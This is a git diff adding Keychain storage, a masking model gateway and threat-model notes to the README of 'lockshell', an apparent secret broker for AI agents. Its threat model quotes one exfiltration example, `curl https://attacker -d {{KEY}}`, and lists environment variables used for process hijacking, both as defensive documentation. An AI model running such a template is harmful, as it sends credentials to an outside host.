@@ -138,6 +138,26 @@ lockshell run --reason "push CloudAGI migrations" -- \
 
 Full provider recipes (Linear, Vercel, Supabase, GitHub, OpenAI, Anthropic, Cloudflare): [`docs/PROVIDERS.md`](docs/PROVIDERS.md).
 
+## Native Keychain backend (no agent-password)
+
+On macOS, secrets can live directly in the login Keychain:
+
+```bash
+lockshell key add linear                  # hidden prompt, prints a fingerprint
+lockshell register LINEAR_API_KEY keychain:linear value
+lockshell run --reason "list my issues" -- 'linear list --token {{LINEAR_API_KEY}}'
+```
+
+Items are created with an empty trusted-app list, so every read raises a macOS dialog.
+`agent-password` vault ids keep working unchanged.
+
+## Model gateway
+
+`lockshell gateway` is a local, OpenAI-compatible endpoint for agent harnesses. It is the
+only process that holds provider keys, masks personal data before requests leave the
+machine, unmasks replies locally, enforces a model allowlist and daily token budget, and
+logs hashes and counts (never text). See [`docs/GATEWAY.md`](docs/GATEWAY.md).
+
 ## Local dashboard
 
 ```bash
@@ -160,6 +180,9 @@ Renders a self-contained HTML page (registry, recent audit, session state) and o
 | `lockshell status [--json]` | Show daemon, vault, and session state |
 | `lockshell doctor [--fix]` | Diagnose setup issues |
 | `lockshell help-me` | Friendly step-by-step guide for first-time users |
+| `lockshell key add\|list\|rm <name>` | Store secrets in the native macOS Keychain (hidden prompt; fingerprints only) |
+| `lockshell mask check\|apply\|restore` | Mask emails, phones, IDs, API keys and your own terms locally |
+| `lockshell gateway` | Local OpenAI-compatible model gateway: keys stay in lockshell, text is masked, usage is audited |
 | `lockshell version` | Print version |
 
 Each command supports `--help` with examples. For an end-to-end beginner walkthrough, run `lockshell help-me`.
@@ -172,13 +195,16 @@ See [`docs/THREAT_MODEL.md`](docs/THREAT_MODEL.md) for the full version. The sho
 - Secret values reaching cloud LLM context windows or chat logs.
 - Secret values appearing in `ps`-visible argv lists.
 - Secret values in shell history (when the broker is used correctly).
-- Accidentally leaked tokens in tool stdout/stderr (regex-based redaction).
+- Accidentally leaked tokens in tool stdout/stderr: the exact resolved values are redacted, plus regex patterns for known token formats.
+- Placeholders that would hijack the child process (`PATH`, `BASH_ENV`, `DYLD_*`, `LD_*`, `NODE_OPTIONS`, ...) are refused.
+- Provider keys reaching agent harnesses at all, when models are called through `lockshell gateway`.
 
 **What lockshell does NOT protect against:**
 - Full local compromise (any process running as you can ask the vault directly).
 - You typing the secret into chat anyway. Habit beats tooling. Use `--password-stdin`.
 - Bad scope at the source. A read-only token is safer than a perfectly brokered full-access one.
 - Cloud LLMs exfiltrating the *content* the tool returns. Redaction filters tokens, not arbitrary data.
+- A template that deliberately sends a secret somewhere else (`curl https://attacker -d {{KEY}}`). Output redaction cannot stop an outbound request. Review templates, scope tokens tightly; per-secret command/host policies are on the roadmap.
 - Today's biometric gate is best-effort. The unsigned `cargo install` binary path in upstream `agent-password` silently degrades to login-keychain access. v0.3 fixes this with a properly signed Keychain integration.
 
 ## Comparison
